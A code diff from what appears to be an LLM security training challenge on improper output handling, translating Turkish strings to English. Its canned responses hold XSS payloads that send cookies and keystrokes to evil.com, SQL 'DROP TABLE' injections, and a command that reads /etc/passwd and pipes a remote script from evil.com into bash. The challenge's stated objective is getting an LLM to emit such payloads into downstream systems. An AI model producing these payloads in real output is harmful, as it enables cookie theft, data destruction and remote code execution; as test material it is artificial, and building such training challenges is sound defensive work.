@@ -15,8 +15,8 @@ class OutputHandlingChallenge(BaseChallenge):
     # OWASP LLM Top 10 2026: Improper Output Handling moved from LLM05 to
     # LLM10, matching tools/llm_scanner.py's OWASP_MAP.
     owasp_id = "LLM10"
-    description = "LLM ciktisini downstream sisteme enjekte ederek XSS/SQLi/RCE tetikleyin."
-    objective = "LLM'in urettigi ciktida XSS, SQL injection veya komut enjeksiyonu saglayin."
+    description = "Inject the LLM's output into a downstream system to trigger XSS/SQLi/RCE."
+    objective = "Get the LLM to produce output that carries XSS, SQL injection or command injection."
     secrets = {"xss_trigger": "<script>", "sqli_trigger": "DROP TABLE", "rce_trigger": "os.system"}
     atlas_mapping = ["AML.T0048"]
 
@@ -47,22 +47,22 @@ class OutputHandlingChallenge(BaseChallenge):
         if self.difficulty == Difficulty.EASY:
             return [
                 {"pattern": r"html|sayfa|page|web",
-                 "response": '<div>Hosgeldiniz!</div>\n<script>fetch("https://evil.com/steal?c="+document.cookie)</script>'},
+                 "response": '<div>Welcome!</div>\n<script>fetch("https://evil.com/steal?c="+document.cookie)</script>'},
                 {"pattern": r"sql|sorgu|query|veritaban",
                  "response": "SELECT * FROM users WHERE name = 'admin'; DROP TABLE users;--"},
                 {"pattern": r"komut|command|shell|calistir|run",
-                 "response": "Dosya isleme komutu:\nos.system('cat /etc/passwd && curl evil.com/shell.sh | bash')"},
+                 "response": "File-handling command:\nos.system('cat /etc/passwd && curl evil.com/shell.sh | bash')"},
                 {"pattern": r"form|input|alan",
                  "response": '<form><input type="text" onfocus="fetch(\'https://evil.com/keylog?k=\'+this.value)"></form>'},
                 {"pattern": r"link|url|adres",
-                 "response": '<a href="javascript:document.location=\'https://evil.com/steal?c=\'+document.cookie">Tiklayin</a>'},
+                 "response": '<a href="javascript:document.location=\'https://evil.com/steal?c=\'+document.cookie">Click here</a>'},
                 {"pattern": r"resim|image|img",
                  "response": '<img src="x" onerror="fetch(\'https://evil.com/xss\')">'},
             ]
         elif self.difficulty == Difficulty.MEDIUM:
             return [
                 {"pattern": r"html|sayfa",
-                 "response": '<div>Merhaba</div><img src=x onerror=fetch("https://evil.com")>'},
+                 "response": '<div>Hello</div><img src=x onerror=fetch("https://evil.com")>'},
                 {"pattern": r"sql|sorgu",
                  "response": "SELECT * FROM users; DROP TABLE sessions;--"},
                 {"pattern": r"svg|grafik",
